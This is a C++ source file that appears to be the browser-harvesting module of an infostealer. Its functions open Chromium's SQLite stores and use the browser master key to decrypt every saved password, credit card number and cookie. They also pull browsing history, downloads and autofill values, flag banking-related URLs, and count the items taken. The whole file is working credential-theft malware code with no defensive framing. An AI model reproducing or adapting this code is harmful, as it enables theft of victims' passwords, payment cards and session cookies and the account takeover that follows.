#include "DecryptChromium.h"
#include "Banking.h"
#include "Counter.h"
#include "BCrypt.h"
#include "include/SQLiteCpp/SQLiteCpp.h"
#include <codecvt>

std::vector<Password> DecryptChromium::DecryptPassword(std::string DbPath, BROWSER browser)
{
    // Declare a vector to store decrypted passwords
    std::vector<Password> result;

    // Get the Master Key for decryption based on the browser type
    // This key is used to decrypt encrypted passwords
    DATA_BLOB* MasterKey = BCrypt::GetMasterKey(browser);

    // Open the SQLite database (DbPath contains the path to the Chromium database)
    SQLite::Database db(DbPath.c_str());

    // Prepare an SQL query to select relevant fields from the 'logins' table
    SQLite::Statement selectStmt(db, "SELECT origin_url, action_url, username_value, password_value FROM logins");

    // Loop over each row of the 'logins' table
    while (selectStmt.executeStep()) {
        // Extract the values for website, login URL, username, and encrypted password from the row
        std::string website = selectStmt.getColumn(0).getText();
        std::string loginUrl = selectStmt.getColumn(1).getText();
        std::string userName = selectStmt.getColumn(2).getText();
        const void* passwordBlob = selectStmt.getColumn(3).getBlob(); // Encrypted password
        int passwordBlobSize = selectStmt.getColumn(3).getBytes(); // Size of the encrypted password

        // If the password is not empty (i.e., has been encrypted)

        if (passwordBlobSize > 0) {
            // Convert the encrypted password into a byte vector
            std::vector<BYTE> DataVec(static_cast<const BYTE*>(passwordBlob), static_cast<const BYTE*>(passwordBlob) + passwordBlobSize);

            // Decrypt the password using AES decryption with the master key
            std::string pass = BCrypt::AESDecrypter(DataVec, passwordBlobSize, *MasterKey);

            // Create a Password struct to store the decrypted information
            Password password;
            password.Website = website;
            password.LoginUrl = loginUrl;
            password.Username = userName;
            password.Pass = pass;

            // Add the decrypted password information to the result vector
            result.push_back(password);

            // Optionally, scan the login URL for banking-related data
            Banking::ScanData(password.LoginUrl);

            // Increment the counter for passwords
            Counter::Passwords++;
        }
    }

    // Clean up by deleting the MasterKey
    delete MasterKey;

    // Return the vector containing the decrypted passwords
    return result;
}

std::vector<Site> DecryptChromium::DecryptHistory(std::string DbPath)
{
    // Declare a vector to store the browsing history
    std::vector<Site> result;

    // Open the SQLite database file
    SQLite::Database db(DbPath.c_str());

    // Prepare an SQL query to select relevant fields from the 'urls' table
    SQLite::Statement selectStmt(db, "SELECT url,title,visit_count FROM urls");

    // Loop over each row of the 'urls' table
    while (selectStmt.executeStep()) {
        // Extract the values for the URL, title, and visit count from the row
        std::string urll = selectStmt.getColumn(0).getText();
        std::string title = selectStmt.getColumn(1).getText();
        const char* count = selectStmt.getColumn(2).getText();
        int passwordBlobSize = selectStmt.getColumn(2).getBytes(); // Size of the visit count (in this case, just a number)

        // Convert the title to a wide string for proper encoding
        std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
        std::wstring wtitle = conv.from_bytes(title);

        // If the visit count value exists (non-empty)
        if (passwordBlobSize > 0) {
            // Create a Site struct to store the extracted information
            Site site;
            site.Url = urll;
            site.Title = wtitle;
            site.Count = atoi(count); // Convert the visit count string to an integer

            // Add the site information to the result vector
            result.push_back(site);

            // Optionally, scan the URL for banking-related data
            Banking::ScanData(urll);

            // Increment the counter for browsing history entries
            Counter::History++;
        }
        else {
            // Print a message if no site is found for this URL
            std::cout << "No site found for this url" << std::endl;
        }
    }

    // Return the vector containing the site history
    return result;
}

std::vector<Download> DecryptChromium::DecryptDownloads(std::string DbPath)
{
    // Declare a vector to store the downloaded files information
    std::vector<Download> result;

    // Open the SQLite database file
    SQLite::Database db(DbPath.c_str());

    // Prepare an SQL query to select relevant fields from the 'downloads' table
    SQLite::Statement selectStmt(db, "SELECT tab_url,target_path,id FROM downloads");

    // Loop over each row of the 'downloads' table
    while (selectStmt.executeStep()) {
        // Extract the values for the tab URL, target path, and download ID from the row
        std::string tab_url = selectStmt.getColumn(0).getText();
        std::string target_path = selectStmt.getColumn(1).getText();
        const char* id = selectStmt.getColumn(2).getText();
        int passwordBlobSize = selectStmt.getColumn(2).getBytes(); // Size of the download ID (usually a small identifier)

        // If the download entry exists (non-empty)
        if (passwordBlobSize > 0) {
            // Create a Download struct to store the extracted information
            Download Download;
            Download.Tag_Url = tab_url;
            Download.Target_Path = target_path;

            // Add the download information to the result vector
            result.push_back(Download);

            // Optionally, scan the download URL for related data
            Banking::ScanData(Download.Tag_Url);

            // Increment the counter for downloads
            Counter::Downloads++;
        }
        else {
            // Print a message if no download is found for this URL
            std::cout << "No Download found for this url" << std::endl;
        }
    }

    // Return the vector containing the download information
    return result;
}

std::vector<CreditCard> DecryptChromium::DecryptCreditCard(std::string DbPath, BROWSER browser)
{
    std::vector<CreditCard> result;
    //std::string DbPath = GetDbPath(browser);
    DATA_BLOB* MasterKey = BCrypt::GetMasterKey(browser);

    // Open the database file
    SQLite::Database db(DbPath.c_str());

    // Prepare the SELECT statement
    SQLite::Statement selectStmt(db, "SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards");

    // Iterate over the rows of the logins table
    while (selectStmt.executeStep()) {
        // Extract the values of the columns
        const void* Number = selectStmt.getColumn(0).getText();
        std::string ExpYear = selectStmt.getColumn(1).getText();
        std::string ExpMonth = selectStmt.getColumn(2).getText();
        std::string Name = selectStmt.getColumn(3).getText();
        int passwordBlobSize = selectStmt.getColumn(0).getBytes();
        
        if (passwordBlobSize > 0) {

            std::vector<BYTE> DataVec(static_cast<const BYTE*>(Number), static_cast<const BYTE*>(Number) + passwordBlobSize);

            // Decrypt the password
            std::string pass = BCrypt::AESDecrypter(DataVec, passwordBlobSize, *MasterKey);
            CreditCard Credit;
            Credit.ExpMonth = ExpMonth;
            Credit.ExpYear = ExpYear;
            Credit.Name = Name;
            Credit.Number = pass;

            result.push_back(Credit);

            Counter::CreditCards++;
        }
        else {
            // Print a message if the password is empty
            std::cout << "No password found for this login" << std::endl;
        }
    }

    delete MasterKey;
    return result;
}

std::vector<Cookie> DecryptChromium::DecryptCookie(std::string DbPath, BROWSER browser)
{
    std::vector<Cookie> result;

    // Retrieve MasterKey
    DATA_BLOB* MasterKey = BCrypt::GetMasterKey(browser);
    if (!MasterKey) {
        std::cerr << "Failed to retrieve master key" << std::endl;
        return result;
    }

    try {
        // Open the database
        SQLite::Database db(DbPath.c_str());

        // Prepare the SELECT statement
        SQLite::Statement selectStmt(db, "SELECT host_key, name, path, expires_utc, encrypted_value, is_secure FROM cookies");

        // Iterate over the rows
        while (selectStmt.executeStep()) {
            std::string host_key = selectStmt.getColumn(0).getText();
            std::string name = selectStmt.getColumn(1).getText();
            std::string path = selectStmt.getColumn(2).getText();
            std::string expires_utc = selectStmt.getColumn(3).getText();
            const void* encrypted_value = selectStmt.getColumn(4).getBlob();
            int passwordBlobSize = selectStmt.getColumn(4).getBytes();
            std::string is_secure = selectStmt.getColumn(5).getText();

            if (passwordBlobSize > 0 && encrypted_value) {
                std::vector<BYTE> DataVec(static_cast<const BYTE*>(encrypted_value),
                    static_cast<const BYTE*>(encrypted_value) + passwordBlobSize);

                // Decrypt the value
                std::string value = BCrypt::AESDecrypter(DataVec, passwordBlobSize, *MasterKey);

                Cookie cookie{ host_key, name, path, expires_utc, value, is_secure };
                result.push_back(cookie);

                // Analyze the cookie
                Banking::ScanData(cookie.HostKey);
                Counter::Cookies++;
            }
            else {
                std::cout << "No encrypted value for host: " << host_key << std::endl;
            }
        }

    }
    catch (const SQLite::Exception& e) {
        std::cerr << "SQLite error: " << e.what() << std::endl;
    }

    // Cleanup
    if (MasterKey) {
        delete MasterKey;
        MasterKey = nullptr;
    }

    return result;
}

std::vector<AutoFill> DecryptChromium::DecryptAutoFill(std::string DbPath)
{
    // Create a vector to store autofill data
    std::vector<AutoFill> result;

    // Open the database file at the given path
    SQLite::Database db(DbPath.c_str());

    // Prepare an SQL query to retrieve autofill data
    SQLite::Statement selectStmt(db, "SELECT name,value FROM autofill");

    // Iterate through each row in the 'autofill' table
    while (selectStmt.executeStep()) {
        // Extract the autofill name and value
        std::string name = selectStmt.getColumn(0).getText(); // Field name (e.g., "First Name")
        std::string value = selectStmt.getColumn(1).getText(); // Field value (e.g., "John")

        // Create an AutoFill object to store the extracted data
        AutoFill autofll;
        autofll.Name = name;
        autofll.Value = value;

        // Add the autofill information to the result vector
        result.push_back(autofll);

        // Increment the counter for autofill entries
        Counter::AutoFill++;
    }

    // Return the autofill data
    return result;
}
